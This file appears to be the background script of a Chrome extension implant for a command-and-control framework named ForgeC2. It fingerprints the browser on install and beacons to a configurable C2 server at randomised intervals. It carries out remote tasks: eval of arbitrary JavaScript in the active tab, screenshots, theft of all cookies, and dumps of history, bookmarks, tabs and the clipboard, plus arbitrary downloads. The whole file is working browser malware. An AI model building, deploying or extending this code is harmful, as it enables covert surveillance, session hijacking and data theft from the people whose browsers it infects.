const C2_SERVER = "<C2_SERVER>";
const C2_TOKEN = "<C2_TOKEN>";
const STORAGE_KEY = "forge_c2";
const ALARM_NAME = "forge_c2_beacon";

function generateUUID() {
  return crypto.randomUUID();
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

chrome.runtime.onInstalled.addListener(async () => {
  const data = await chrome.storage.local.get(STORAGE_KEY);
  if (!data[STORAGE_KEY] || !data[STORAGE_KEY].uuid) {
    const state = {
      uuid: generateUUID(),
      created_at: new Date().toISOString(),
      info: {
        browser: navigator.userAgent || "unknown",
        platform: navigator.platform || "unknown",
        language: navigator.language || "unknown",
      },
    };
    await chrome.storage.local.set({ [STORAGE_KEY]: state });
  }
  const interval = randomInt(30, 60);
  chrome.alarms.create(ALARM_NAME, { periodInMinutes: interval / 60 });
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === ALARM_NAME) {
    doBeacon();
  }
});

async function getC2Server() {
  const data = await chrome.storage.local.get(STORAGE_KEY);
  return (data[STORAGE_KEY] && data[STORAGE_KEY].c2_server) || C2_SERVER;
}

function beaconHeaders() {
  const headers = { "Content-Type": "application/json" };
  if (C2_TOKEN && C2_TOKEN.indexOf("<C2_TOKEN>") === -1 && C2_TOKEN.length > 0) {
    headers["X-ForgeC2-Chrome-Token"] = C2_TOKEN;
  }
  return headers;
}

async function doBeacon() {
  try {
    const data = await chrome.storage.local.get(STORAGE_KEY);
    const state = data[STORAGE_KEY] || {};
    const uuid = state.uuid;
    const c2 = state.c2_server || C2_SERVER;
    if (!uuid || !c2 || String(c2).indexOf("<C2_SERVER>") !== -1) {
      console.warn("[C2] beacon skipped: missing uuid or C2 server URL");
      return;
    }

    const pendingResults = state.results || [];
    const info = state.info || {};

    const beacon = {
      uuid: uuid,
      info: info,
      results: pendingResults,
    };

    const resp = await fetch(c2 + "/api/chrome/beacon", {
      method: "POST",
      headers: beaconHeaders(),
      body: JSON.stringify(beacon),
    });

    if (!resp.ok) {
      console.warn("[C2] beacon failed:", resp.status);
      return;
    }

    state.results = [];
    await chrome.storage.local.set({ [STORAGE_KEY]: state });

    const response = await resp.json();
    if (response.tasks && response.tasks.length > 0) {
      for (const task of response.tasks) {
        await executeTask(task, c2);
      }
    }
  } catch (err) {
    console.error("[C2] beacon error:", err);
  }
}

async function activeTabId() {
  const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
  if (tabs.length > 0 && tabs[0].id != null) {
    return tabs[0].id;
  }
  const any = await chrome.tabs.query({ active: true });
  if (any.length > 0 && any[0].id != null) {
    return any[0].id;
  }
  return null;
}

async function evalInTab(tabId, code) {
  const results = await chrome.scripting.executeScript({
    target: { tabId: tabId },
    world: "MAIN",
    func: (src) => {
      // eslint-disable-next-line no-eval
      return eval(src);
    },
    args: [code],
  });
  if (!results || results.length === 0) {
    return "";
  }
  try {
    return JSON.stringify(results.map((r) => r.result));
  } catch {
    return String(results[0] && results[0].result);
  }
}

async function executeTask(task, c2) {
  let result = { task_id: task.id, type: task.type, output: "", error: "" };

  try {
    switch (task.type) {
      case "chrome_c2": {
        const data = await chrome.storage.local.get(STORAGE_KEY);
        const state = data[STORAGE_KEY] || {};
        result.output = JSON.stringify({
          uuid: state.uuid || "",
          version: chrome.runtime.getManifest().version,
          info: state.info || {},
        });
        break;
      }

      case "chrome_exec": {
        const code = task.command || task.data || "";
        if (!code) {
          result.error = "no command provided";
          break;
        }
        const tabId = await activeTabId();
        if (tabId == null) {
          result.error = "no active tab found";
          break;
        }
        result.output = await evalInTab(tabId, code);
        break;
      }

      case "chrome_script": {
        let code = task.data || task.command || "";
        if (!code) {
          result.error = "no script provided";
          break;
        }
        const tabId = await activeTabId();
        if (tabId == null) {
          result.error = "no active tab found";
          break;
        }
        result.output = await evalInTab(tabId, code);
        break;
      }

      case "chrome_screenshot": {
        const dataUrl = await chrome.tabs.captureVisibleTab({ format: "png" });
        result.output = dataUrl || "";
        break;
      }

      case "chrome_storage": {
        const op = task.command || "get";
        const key = task.path || STORAGE_KEY;
        if (op === "get") {
          const val = await chrome.storage.local.get(key);
          result.output = JSON.stringify(val);
        } else if (op === "set") {
          await chrome.storage.local.set({ [key]: task.data || "" });
          result.output = "ok";
        } else if (op === "remove") {
          await chrome.storage.local.remove(key);
          result.output = "ok";
        } else if (op === "clear") {
          await chrome.storage.local.clear();
          result.output = "ok";
        } else if (op === "list") {
          const all = await chrome.storage.local.get(null);
          result.output = JSON.stringify(Object.keys(all));
        } else {
          result.error = "unknown storage op: " + op;
        }
        break;
      }

      case "chrome_download": {
        const url = task.command || task.url;
        if (url) {
          const dlId = await chrome.downloads.download({ url: url });
          result.output = "download started: " + dlId;
        } else {
          result.output = "no url provided";
        }
        break;
      }

      case "chrome_bookmarks": {
        if (chrome.bookmarks) {
          const tree = await chrome.bookmarks.getTree();
          result.output = JSON.stringify(tree);
        } else {
          result.output = "bookmarks permission not granted";
        }
        break;
      }

      case "chrome_history": {
        if (chrome.history) {
          let query = { text: "", maxResults: 50 };
          if (task.query) {
            try { query = Object.assign(query, JSON.parse(task.query)); } catch { /* keep default */ }
          } else if (task.command) {
            query.text = task.command;
          }
          const items = await chrome.history.search(query);
          result.output = JSON.stringify(items);
        } else {
          result.output = "history permission not granted";
        }
        break;
      }

      case "chrome_cookies": {
        if (chrome.cookies) {
          let details = {};
          if (task.details) {
            try { details = JSON.parse(task.details); } catch { /* keep empty */ }
          } else if (task.path) {
            details.domain = task.path;
          }
          const cookies = await chrome.cookies.getAll(details);
          result.output = JSON.stringify(cookies);
        } else {
          result.output = "cookies permission not granted";
        }
        break;
      }

      case "chrome_tabs": {
        let query = {};
        if (task.query) {
          try { query = JSON.parse(task.query); } catch { /* keep empty */ }
        }
        const tabs = await chrome.tabs.query(query);
        result.output = JSON.stringify(tabs);
        break;
      }

      case "chrome_clipboard": {
        const op = task.command || "get";
        if (op === "get") {
          if (typeof navigator !== "undefined" && navigator.clipboard) {
            result.output = await navigator.clipboard.readText();
          } else {
            result.output = "clipboard read not available in service worker; use chrome_exec in a tab";
          }
        } else if (op === "set") {
          if (typeof navigator !== "undefined" && navigator.clipboard) {
            await navigator.clipboard.writeText(task.data || "");
            result.output = "ok";
          } else {
            result.output = "clipboard write not available in service worker";
          }
        }
        break;
      }

      case "chrome_idle": {
        if (chrome.idle) {
          const state = await chrome.idle.queryState(60);
          result.output = state;
        } else {
          result.output = "idle permission not granted";
        }
        break;
      }

      default: {
        result.error = "unknown task type: " + task.type;
        break;
      }
    }
  } catch (err) {
    result.error = err.message || String(err);
  }

  const data = await chrome.storage.local.get(STORAGE_KEY);
  const state = data[STORAGE_KEY] || {};
  if (!state.results) state.results = [];
  state.results.push(result);
  await chrome.storage.local.set({ [STORAGE_KEY]: state });
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === "force_beacon") {
    doBeacon().then(() => sendResponse({ status: "ok" })).catch(e => sendResponse({ status: "error", error: e.message }));
    return true;
  }
  if (msg.type === "get_status") {
    chrome.storage.local.get(STORAGE_KEY).then(data => {
      sendResponse(data[STORAGE_KEY] || {});
    });
    return true;
  }
});
